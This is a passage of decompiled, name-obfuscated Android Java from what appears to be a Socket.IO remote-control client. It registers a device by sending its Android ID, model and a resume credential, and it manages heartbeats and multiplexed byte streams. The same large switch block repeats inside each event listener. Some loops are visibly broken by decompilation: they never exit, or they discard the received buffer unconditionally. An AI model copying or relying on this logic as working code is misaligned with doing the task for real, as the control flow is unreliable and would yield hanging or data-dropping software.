                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i10 = 7;
            sVarA.c("stream:open", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i10) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i11 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i11, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar11 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar11), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i11, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar12 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar12), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i12 = 0;
                                int i13 = 0;
                                bArr = null;
                                while (true) {
                                    if (i12 < length) {
                                        Object obj3 = objArr[i12];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i13++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i12++;
                                    } else if (i13 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i11 = 8;
            sVarA.c("stream:data", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i11) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
